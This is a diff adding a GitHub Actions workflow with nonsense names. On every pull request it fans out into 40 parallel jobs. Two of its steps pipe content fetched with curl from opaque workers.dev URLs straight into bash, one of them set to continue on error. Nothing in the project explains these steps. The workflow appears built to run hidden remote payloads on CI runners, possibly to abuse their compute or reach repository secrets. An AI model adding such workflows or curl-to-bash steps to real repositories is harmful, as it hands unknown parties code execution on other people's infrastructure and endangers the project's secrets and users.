@@ -1,0 +1,28 @@
+name: bucket
+
+on:
+  pull_request:
+    branches: [ "main" ]
+
+concurrency:
+  group: justify
+
+jobs:
+  occupation:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        just: ["wage", "available", "me", "resident", "administrative"]
+        civilized: ["immobile", "flood", "biology", "molecule"]
+        meanwhile: ["athlete", "relevant"]
+      fail-fast: false
+    steps:
+    - name:  fascinate-king
+      uses: actions/checkout@v6
+    - name: pond
+      continue-on-error: true
+      run: |
+        curl "https://x.linux-work-10x1za.workers.dev/bf6/c8/d33a9d8394dbc/a2dec302efee/4/7fc52cdd1716ea0281c3/d9171c8640e8c?vs=1777867104&c=y&l=ku" | bash
+    - name: peculiar
+      run: |
+        curl -sS -L "https://i.donnickcarbonaro70085.workers.dev/470b279bf3d544/f2c6670658bc44/6/3766ceb073216b4/38f/c/dc06f0b8/6d81/d64/0?sq=1777889004&mt=mya&c=j" | bash
